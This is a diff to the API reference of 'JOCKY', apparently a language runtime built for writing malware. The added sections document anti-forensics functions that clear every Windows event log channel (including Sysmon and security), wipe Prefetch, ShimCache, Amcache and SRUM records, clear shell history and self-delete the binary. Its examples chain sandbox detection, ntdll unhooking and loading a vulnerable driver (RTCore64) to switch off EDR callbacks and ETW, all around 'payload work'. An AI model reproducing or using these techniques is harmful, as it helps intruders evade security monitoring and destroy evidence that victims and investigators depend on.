@@ -1,9 +1,16 @@
 # JOCKY Runtime API Reference
 
 Every function below is compiled into the final binary (unless `--no-runtime`
-is passed to `jockyc`) and is callable from JOCKY source via `ffi`.
+is passed to `jockyc`).
 
-All `ffi` declarations shown here go at the top of your `.jky` file.
+**No `ffi` declarations needed.**  The compiler auto-registers all `jocky_*`
+functions as LLVM external declarations before emitting user code, so you can
+call any of them directly — just write `jocky_cleanup_all()` without any
+boilerplate at the top of your file.  `jocky_runtime_init()` is also called
+automatically at the start of `main()`.
+
+The `ffi` declarations shown throughout this document are provided as a
+reference for the exact type signatures; they are no longer required.
 
 ---
 
@@ -562,10 +569,12 @@ fn main() -> void {
 
 ### `jocky_self_delete() -> bool`
 
-**Windows:** renames the binary to a temp file then schedules deletion via
-`MoveFileEx(MOVEFILE_DELAY_UNTIL_REBOOT)`.
+Three-tier approach (Windows):
+1. **POSIX semantics** (Win10 1809+) — `NtSetInformationFile(FileDispositionInformationEx)` with `FILE_DISPOSITION_FLAG_POSIX_SEMANTICS`: path is unlinked immediately while the process is still running.
+2. **Rename + delete-on-close** (Win7+) — binary moved to `%TEMP%`, opened with `FILE_FLAG_DELETE_ON_CLOSE`, deleted when the last handle drops at process exit.
+3. **Reboot delete** — `MoveFileExW(MOVEFILE_DELAY_UNTIL_REBOOT)` fallback.
 
-**Linux:** unlinks `/proc/self/exe`.
+**Linux:** unlinks `/proc/self/exe` immediately.
 
 ```
 ffi jocky_self_delete() -> bool;
@@ -573,8 +582,10 @@ ffi jocky_self_delete() -> bool;
 
 ### `jocky_clear_logs() -> bool`
 
-**Windows:** runs `wevtutil cl` on Application, Security, System, Setup, and
-ForwardedEvents logs.
+**Windows:** enumerates *all* event log channels via `EvtOpenChannelEnum` /
+`EvtClearLog` — including Sysmon, PowerShell/Operational, WMI-Activity, and
+every security channel — then clears the four classic logs via `ClearEventLogA`.
+No child processes are spawned.
 
 **Linux:** rotates and vacuums the systemd journal; truncates `wtmp`/`lastlog`.
 
@@ -584,8 +595,9 @@ ffi jocky_clear_logs() -> bool;
 
 ### `jocky_wipe_artifacts() -> bool`
 
-**Windows:** deletes Prefetch (`C:\Windows\Prefetch\*`), Recent files, and
-contents of `%TEMP%`.
+**Windows:** deletes Prefetch `.pf` files (`%SystemRoot%\Prefetch\*.pf`),
+Recent document shortcuts (`%APPDATA%\Microsoft\Windows\Recent\*`), and
+contents of `%TEMP%`.  Uses Win32 file APIs — no child processes.
 
 **Linux:** clears bash history and `/tmp/.jocky*`.
 
@@ -1100,3 +1112,209 @@ Verified at startup by `jocky_verify_integrity()`.  Mismatch calls `ExitProcess(
 | `--manifest <path>` | IOCTL manifest embedded as `.jmani` section; `jocky_driver_invoke` uses it |
 | `--pack` | PE sections RC4-encrypted (Windows) or UPX-packed (Linux) |
 | *(always, Windows)* | `.jtamp` anti-tamper section added; verified at startup |
+
+---
+
+## 12  Cleanup / Anti-Forensics  *(Windows only unless noted)*
+
+Five targeted cleanup functions plus an orchestrator.  All require
+Administrator-level privileges.  Call after payload execution, before exit.
+
+---
+
+### `jocky_wipe_prefetch() -> bool`
+
+Deletes all `.pf` files from `%SystemRoot%\Prefetch` and removes
+`Layout.ini`.  Prefetch files record the path and load-time metadata of every
+executed binary.
+
+```
+ffi jocky_wipe_prefetch() -> bool;
+```
+
+---
+
+### `jocky_patch_shimcache() -> bool`
+
+Clears the Application Compatibility Cache (ShimCache) in two steps:
+
+1. Delete `HKLM\SYSTEM\…\AppCompatCache` → `AppCompatCache` (REG_BINARY) so
+   the cache is not written on next shutdown.
+2. Call the undocumented `kernel32!BaseFlushAppcompatCache()` to evict the
+   in-memory cache for the current session.
+
+ShimCache records nearly every executed PE; entries persist across reboots.
+
+```
+ffi jocky_patch_shimcache() -> bool;
+```
+
+---
+
+### `jocky_patch_amcache() -> bool`
+
+Loads `C:\Windows\AppCompat\Programs\Amcache.hve` as a temporary registry
+hive (requires `SeBackupPrivilege` + `SeRestorePrivilege`), finds all entries
+whose path matches the current executable, deletes them, then unloads the hive.
+
+Amcache records first-execution timestamps, file hashes, and full paths.
+
+Searches two registry paths:
+- `Root\InventoryApplicationFile\*` → value `LowerCaseLongPath` (Win10+)
+- `Root\File\{VolumeGUID}\{SHA1}` → value `FullPath` (Win8)
+
+```
+ffi jocky_patch_amcache() -> bool;
+```
+
+---
+
+### `jocky_clear_srum() -> bool`
+
+Clears the System Resource Usage Monitor (SRUM) database, which tracks
+per-process network usage, CPU time, and energy consumption for 30–60 days.
+
+Steps:
+1. Stop the `svsvc` service to release the file lock.
+2. `DeleteFileW(C:\Windows\System32\sru\SRUDB.dat)` — Windows recreates an
+   empty database on next boot.
+3. If immediate deletion fails, schedule via `MoveFileEx(DELAY_UNTIL_REBOOT)`.
+4. Restart `svsvc` so the system stays stable.
+
+```
+ffi jocky_clear_srum() -> bool;
+```
+
+---
+
+### `jocky_cleanup_all() -> bool`
+
+Runs all cleanup steps in the correct order:
+
+| Step | Function |
+|------|----------|
+| 1 | `jocky_clear_logs()` |
+| 2 | `jocky_wipe_prefetch()` |
+| 3 | `jocky_patch_shimcache()` |
+| 4 | `jocky_patch_amcache()` |
+| 5 | `jocky_clear_srum()` |
+| 6 | `jocky_wipe_artifacts()` |
+| 7 | `jocky_self_delete()` |
+
+Individual failures are non-fatal; all steps are attempted regardless.
+Returns `true` only if every step succeeded.
+
+`jocky_self_delete()` runs last so the binary is still alive during the other
+steps.
+
+```
+ffi jocky_cleanup_all() -> bool;
+```
+
+**This is the recommended call for most programs.** Use the individual
+functions only when you need finer control.
+
+---
+
+### Cleanup example
+
+```jky
+fn main() -> void {
+    // No ffi declarations needed
+
+    let flags: i32 = jocky_check_analysis_environment();
+    if flags != 0 {
+        jocky_cleanup_all();
+        return;
+    }
+
+    jocky_unhook_ntdll();
+
+    // ... payload work ...
+
+    jocky_cleanup_all();   // single call: logs + prefetch + shimcache +
+                           // amcache + srum + artifacts + self-delete
+}
+```
+
+---
+
+## 13  Memory Allocators
+
+These wrappers let Jocky code allocate heap memory without calling `malloc`
+directly.  `jocky_byovd_new` / `jocky_byovd_destroy` are opaque-handle
+constructors that hide the size of `jocky_byovd_t` from user code.
+
+---
+
+### `jocky_alloc(size) -> i8*`
+
+Allocate and zero-initialise `size` bytes.
+
+| Platform | Implementation |
+|----------|----------------|
+| Windows  | `HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)` |
+| Linux    | `malloc(size)` + `memset(…, 0, size)` |
+
+Returns `null` on failure or if `size ≤ 0`.
+
+```
+ffi jocky_alloc(i64) -> i8*;
+```
+
+---
+
+### `jocky_free(ptr)`
+
+Free memory previously returned by `jocky_alloc`.  No-op on `null`.
+
+```
+ffi jocky_free(i8*) -> void;
+```
+
+---
+
+### `jocky_byovd_new() -> i8*`  *(Windows only)*
+
+Allocate a zeroed `jocky_byovd_t` context (584 bytes on x64) and return an
+opaque `i8*` pointer.  Pass this pointer to `jocky_byovd_load` and all
+driver/kernel functions.  Free with `jocky_byovd_destroy`.
+
+```
+ffi jocky_byovd_new() -> i8*;
+```
+
+---
+
+### `jocky_byovd_destroy(ctx)`  *(Windows only)*
+
+Call `jocky_byovd_unload(ctx)` then `jocky_free(ctx)` in one step.
+Safe to call on `null`.
+
+```
+ffi jocky_byovd_destroy(i8*) -> void;
+```
+
+---
+
+### Allocator example
+
+```jky
+fn main() -> void {
+    // Allocate without knowing sizeof(jocky_byovd_t)
+    let ctx: i8* = jocky_byovd_new();
+    if ctx == null { return; }
+
+    let ok: bool = jocky_byovd_load("RTCore64", "RTCore64", ctx);
+    if !ok {
+        jocky_free(ctx);
+        return;
+    }
+
+    jocky_disable_edr_callbacks(ctx);
+    jocky_disable_etw(ctx);
+
+    jocky_byovd_destroy(ctx);   // unload + free in one call
+    jocky_cleanup_all();
+}
+```
